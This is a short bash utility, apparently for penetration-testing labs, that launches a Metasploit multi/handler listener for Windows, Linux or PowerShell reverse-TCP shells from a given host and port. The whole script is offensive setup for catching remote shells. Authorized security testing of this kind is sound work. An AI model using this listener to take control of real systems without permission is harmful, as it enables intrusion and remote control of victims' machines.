#!/bin/bash

RED='\033[31m'
GREEN='\033[32m'
BLUE='\033[34m'
YELLOW='\033[33m'
CYAN='\033[36m'
NC='\033[0m'

usage() {
    echo -e "${RED}Usage: msfshell <lhost> <lport> [platform]${NC}"
    echo -e "${RED}  Ex:  msfshell 10.10.14.5 4444${NC}"
    echo -e "${RED}  Ex:  msfshell 10.10.14.5 4444 linux${NC}"
    echo -e "${RED}  Ex:  msfshell 10.10.14.5 4444 ps1${NC}"
    echo ""
    echo -e "${BLUE}  Platforms: windows (default), linux, ps1${NC}"
    exit 1
}

[ "$#" -lt 2 ] && usage

LHOST="$1"
LPORT="$2"
PLATFORM="${3:-windows}"

case "$PLATFORM" in
    windows|win)
        PAYLOAD="windows/x64/meterpreter/reverse_tcp"
        LABEL="Windows x64 Meterpreter"
        ;;
    linux)
        PAYLOAD="linux/x64/meterpreter/reverse_tcp"
        LABEL="Linux x64 Meterpreter"
        ;;
    ps1|powershell)
        PAYLOAD="windows/x64/powershell_reverse_tcp"
        LABEL="PowerShell Reverse Shell"
        ;;
    *)
        echo -e "${RED}Unknown platform: $PLATFORM${NC}"
        usage
        ;;
esac

echo ""
echo -e "${YELLOW}== MSF Handler ==${NC}"
echo -e "${CYAN}Payload: $LABEL${NC}"
echo -e "${CYAN}LHOST:   $LHOST${NC}"
echo -e "${CYAN}LPORT:   $LPORT${NC}"
echo ""

msfconsole -q -x "use multi/handler; set payload $PAYLOAD; set lhost $LHOST; set lport $LPORT; run"
